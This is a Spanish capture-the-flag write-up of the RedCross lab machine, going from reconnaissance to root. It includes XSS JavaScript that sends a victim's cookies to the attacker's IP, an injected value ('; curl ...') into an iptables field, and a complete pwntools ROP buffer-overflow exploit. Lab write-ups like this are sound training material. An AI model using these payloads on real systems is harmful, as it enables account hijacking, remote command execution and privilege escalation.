------
- Tags:  #buffer-overflow #xss-reflected #xss #nx-enable #subdomain #linux 
---------
## Técnicas utilizadas
- Subdomain Enumeration  
- XSS Injection - Stealing the admin user cookie  
- Injection RCE  
- Abusing Custom Binary - Binary Exploitation  
- Buffer Overflow [x64] [ROP Attacks using PwnTools] [NX Bypass] [ASLR Bypass] [Privilege Escalation]
## Procedimiento

![[Pasted image 20230713210014.png]]

#### Reconocimiento
Si lanzamos un **nmap** sobre la maquina, podemos ver los siguientes puertos abiertos:
```ruby
# nmap -sCV -p22,80,443 10.10.10.113 -oN Ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-17 18:22 MST
Nmap scan report for 10.10.10.113
Host is up (0.35s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
| ssh-hostkey: 
|   2048 67d385f8eeb8062359d7758ea237d0a6 (RSA)
|   256 89b465271f93721abce3227090db3596 (ECDSA)
|_  256 66bda11c327432e2e664e8a5251b4d67 (ED25519)
80/tcp  open  http     Apache httpd 2.4.25
|_http-title: Did not follow redirect to https://intra.redcross.htb/
|_http-server-header: Apache/2.4.25 (Debian)
443/tcp open  ssl/http Apache httpd 2.4.25
|_http-server-header: Apache/2.4.25 (Debian)
| ssl-cert: Subject: commonName=intra.redcross.htb/organizationName=Red Cross International/stateOrProvinceName=NY/countryName=US
| Not valid before: 2018-06-03T19:46:58
|_Not valid after:  2021-02-27T19:46:58
|_ssl-date: TLS randomness does not represent time
|_http-title: Did not follow redirect to https://intra.redcross.htb/
| tls-alpn: 
|_  http/1.1
Service Info: Host: redcross.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.14 seconds
```

Un escaneo con **whaweb** sobre la pagina nos muestra las siguientes tecnologías corriendo por detrás:
```ruby
# whatweb 10.10.10.113 && whatweb 10.10.10.113:443
http://10.10.10.113 [301 Moved Permanently] Apache[2.4.25], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.10.10.113], RedirectLocation[https://intra.redcross.htb/], Title[301 Moved Permanently]
https://intra.redcross.htb/ [302 Found] Apache[2.4.25], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.10.10.113], RedirectLocation[/?page=login]
https://intra.redcross.htb/?page=login [200 OK] Apache[2.4.25], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.10.10.113], PasswordField[pass]
http://10.10.10.113:443 [400 Bad Request] Apache[2.4.25], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.10.10.113], Title[400 Bad Request]
```


---------
#### Subdomain Enumeration
Vemos en el escaneo de **whatweb** nos redirige a un subdominio. Si lo contenplamos en el **/etc/hosts** y entramos vemos una pagina.

--------
#### XSS Injection - Stealing the admin user cookie  
Si visitamos la pagina web vemos un apartado de **login** el cual contiene un enlace hacia un formulario de contacto:
![[Pasted image 20230717182922.png]]

En el apartado de contacto, vemos una estructura basica para un formulario. Viendo que la pagina parece estar aún en desarrollo, podemos intentar un **XSS** en el formulario. Mandamos una inyección tipica de **XSS** para ver si es vulnerable y si es asi, que alguien este viendo nuestra petición:
![[Pasted image 20230717182956.png]]

Y obtenemos una respuesta:
![[Pasted image 20230717183013.png]]

Ahora que confirmamos el **XSS** podemos continuar con el siguiente script para intentar robarle la cookie a la persona que esta viendo nuestro **payload**:
```js
var req1 = new XMLHttpRequest();
req1.open("GET", "http://nuestra-ip/?cookie=" + document.cookie, false);
req1.send(null);
```

Y nos llega la siguiente peticón con las **cookies** correspondientes para el usuario admin:
![[Pasted image 20230717183036.png]]

Si contemplamos estas cookies en nuestro navegador y recargamos la pagina podemos observar que ahora estamos como el usuario **admin**:
![[Pasted image 20230717183612.png]]

--------
#### Injection RCE  
En la pagina de admin vemos algunas entradas. Si bajamos del todo en la web encontramos un input para filtrar por usuarios. Al intentar alguna inyección tipica de SQL encontramos el siguiente output:
![[Pasted image 20230717183632.png]]

Es vulnerable a inyecciones SQL. Podemos intentar robar información de la base de datos para obtener lo que nos interese.
Por otro lado, vemos que en las cookies hay una de nombre **HOST** que tiene el nombre **Admin** podemos intentar suerte o bien, descubrirla por nosotros mismos con **wfuzz** o **Gobuster**. Si lo agregamos al **/etc/hosts** e ingresamos a la pagina vemos un **login**:
![[Pasted image 20230717184019.png]]

Si intentamos con credenciales comunes no llegamos a dar con nada, sin embargo, tenemos la cookie que robamos con anterioridad, podemos tirar una moneda al aire y verificar si las cookies se esta reutilizando. Colocamos las cookies que teniamos de la pagina **Intra** en la pagina **admin**, recargamos y vemos que tenemos acceso:
![[Pasted image 20230717184129.png]]

Dentro de este panel de admin, vemos que hay 2 modulos. Uno de ellos nos permite agregar un usuario a nivel de sistema con el cual nos podemos autenticar por ssh posteriormente.

Una vez dentro de la maquina, vemos que no podemos hacer gran cosa. Tenemos una shell limitado y los recursos que se encuentran no parecen ser los de la maquina victima. Encontrmos un script programado en **C** el cual nos traeremos a nuestro maquina para echarlo un ojo despues.

Volviendo al panel de admin, ahora podemos ver de que se trata el otro modulo. Nos pide que ingresemos una IP para agregarla a una **WhiteList**, si ingresamos nuestra IP y lanzamos denuevo un scaneo con **nmap** podemos ver nuevos puertos abiertos:
![[Pasted image 20230717185023.png]]

Esto lo dejaremos de lado ya que no llegamos a nada interesante, sin embargo, podemos llegar aprovechar la función del **WhiteList** para intentar colar un comando. Tenemos que tener en mente que por detras se esta utilizando **Iptables** en una llamada al sistema, podemos ejecutar:
```
10.10.10.10; curl 10.10.10.10
```

Vemos que no pasa nada. Podemos intentar pasar por **BurpSuite** la petición de **Deny** e intentar tambien colar ahi un comando:
![[Pasted image 20230717185539.png]]

Con la ejecución remota de comandos, podemos entablarnos ahora una **Reverse Shell**

-----------
#### Abusing Custom Binary - Binary Exploitation  
Ahora si, dentro del sistema con la shell corectamente establecida, podemos empezar a enumerar. Si filtramos por binarios SUID encontramos el binario compilado del **script** en **C** que habiamos encontrado con anterioridad.
Nos traemos el binario a nuestro equipo para jugar con el y encontrar una forma potencial de inyectar comandos.
En el codigo escrito en **C** podemos ver un posible desbordamiento de memoria:
![[Pasted image 20230717190402.png]]

Si entramos al modo interctivo y a la hora de escoger la opcion ingresamos una cantidad de caracteres superiores al **BUFFER** asignado, podemos ver que se acontece un desbordamiento de memoria:
![[Pasted image 20230717190430.png]]

#### Buffer Overflow [x64] [ROP Attacks using PwnTools] [NX Bypass] [ASLR Bypass] [Privilege Escalation]
Sabiendo que el binario es vulnerable a **Buffer OverFlow** podemos apoyarnos de **GDB** para hacer algunas pruebas. Podemos crear un patron e ingresarlo en las opciones del binario para desbordar la memoria y luego visualizar en que numero de caracter se sobreescribe el registro **$rsp**.

**Crea un patron**:
```
gef> pattern create
```

**Localiza los numeros de caracteres necesarios para el desbodarmiento**:
```
gef> patter offset $rsp
```

Ahora podemos cerciorarnos de que el **ASLR** esta desactivado aplicando un filtro y filtrando por **LIBC** en el siguiente comando ejecuta a nivel de sistema:
```
for i in $(seq 0 100); do ldd $binary | grep libc | awk 'NF{print $NF}' | tr -d '()'; done
```

Vemos que efectivamente esta activado ya que las direcciones que podemos observar no son fijas, son dinamicas.
Podemos proceder a listar los permisos del binario con **CheckSec** y vemos los siguientes permisos:
```ruby
gef➤  checksec
[+] checksec for '/home/sexcott/Desktop/Machines/RedCross/content/iptctl'
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

Esta activado el **Data Execution Prevention** asi que no podemos meter de lleno instrucciones a la pila para que se ejecuten. Examinando el **script** en **C** visualizamos funciones interesantes que podemos reutilizar con **ROP**. Vamos a proceder a crear un **script** en **python3** y dumpear algunas direcciones interesantes para hacer uso de ellas con **Objdump**
```python
from pwn import *
import signal
import sys

#ctrl + c
def def_handler(sig, frame):
	print("\n\n[!] Saliendo...")
	sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

if __name__ == "__main__":

	offset = 29
	junk = b"allow" + b"A"*offset
	null = p64(0x0)

	# payload = junk + pop_rdi + null + setuid + pop_rdi + sh_addr + pop_rsi + null + null + execvp();

	# Lo obtenemos de > ropper --search "pop rdi"
	pop_rdi = p64(0x400de3)

	# Lo obtenemos de > grep "sh"
	sh_addr = p64(0x40046e)

	# Lo obtenemos de > Objdump -D iptcl | grep "execv"
	execvp = p64(0x400760)

	# Lo obtenemos de > ropper --search "pop rsi"
	pop_rsi = p64(0x400de1)

	# Lo obtenemos de > Objdump -D iptcl | grep "setuid"
	setuid = p64(0x400780)

	payload = junk
	payload += pop_rdi
	payload += null
	payload += setuid
	payload += pop_rdi
	payload += sh_addr
	payload += pop_rsi
	payload += null
	payload += null
	payload += execvp
	
	payload += b"\n1.1.1.1\n"
	try:
# Con socat ejecutamos lo siguiente > # socat TCP-LISTEN:9001, EXEC:"/opt/iptctl/ipclt -i"
		p = remote("10.10.10.10", 9001)
	except Exception as e:
		log.error(e)

	p.sendline(payload)
	p.interactive()
```


